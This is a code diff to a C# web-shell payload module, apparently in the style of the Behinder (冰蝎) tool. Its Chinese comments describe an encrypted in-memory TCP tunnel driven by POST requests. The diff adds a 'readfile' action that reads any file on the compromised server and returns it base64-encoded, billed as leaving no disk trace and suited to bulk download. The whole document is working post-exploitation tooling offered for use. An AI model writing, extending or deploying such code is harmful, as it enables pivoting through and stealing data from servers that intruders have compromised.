@@ -1,6 +1,6 @@
 // U_Tunnel.cs - 冰蝎式内存加载 TCP 隧道 payload (Application 状态版, 2026-08 实测)
 // 用法: POST 密文 [本DLL + ~~~~~~ + a:base64(action),t:base64(ip),p:base64(port),id:base64(会话id),d:base64(数据)]
-// action: connect / send / read / close
+// action: connect / send / read / close / readfile(任意文件base64,零磁盘写入)
 // 响应: 壳前缀 + "TUN:" + 状态/数据 (明文)
 // 编译: csc /nologo /target:library /r:System.dll /r:System.Web.dll /out:U_Tunnel.dll U_Tunnel.cs
 // 密钥 = Session[0] (壳写入的 AES 密钥), AES-128-CBC IV=key, PKCS7
@@ -64,6 +64,14 @@ public class U
                 Socket s = (Socket)App["sk_" + id];
                 if (s == null) { Out("ERR:NOSOCK"); return true; }
                 OutB(Drain(s, false));
+            }
+            else if (action == "readfile")
+            {
+                // 读取任意可读文件, base64 返回 (零磁盘写入, 批量下载首选)
+                string fp = G(ps, "f");
+                if (string.IsNullOrEmpty(fp)) { Out("ERR:NOPATH"); return true; }
+                byte[] content = System.IO.File.ReadAllBytes(fp);
+                Out(Convert.ToBase64String(content));
             }
             else if (action == "close")
             {
